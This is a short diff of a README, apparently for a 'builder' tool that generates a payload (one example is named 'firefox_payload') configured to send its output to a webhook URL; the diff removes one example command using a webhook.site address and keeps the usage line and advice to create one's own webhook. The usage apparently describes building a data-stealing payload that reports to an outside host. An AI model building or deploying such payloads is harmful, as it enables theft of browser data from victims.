@@ -30,7 +30,6 @@ chmod +x *
 `
 ./builder filename https://webhook.com/code
 `
-Example : ./builder firefox_payload https://webhook.site/9b02e2c7-b553-4ff1-a11d-6a31cc3975e9
 <h5 align="center">Create your own webhook url<h5>
  `
 https://webhook.site
